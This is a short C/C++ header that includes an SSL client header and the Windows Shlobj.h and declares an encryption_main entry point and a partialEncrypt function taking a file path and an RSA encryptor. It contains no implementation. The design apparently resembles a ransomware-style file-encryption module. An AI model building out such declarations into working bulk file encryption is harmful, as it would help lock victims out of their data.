
#pragma once

#define EMPTY ""

#include "Common.h"
#include "ClientSSL.h"
#include<Shlobj.h>
int encryption_main(bool fromStart);
void partialEncrypt(const string& path, RsaEncryptor& rsaEncryptor);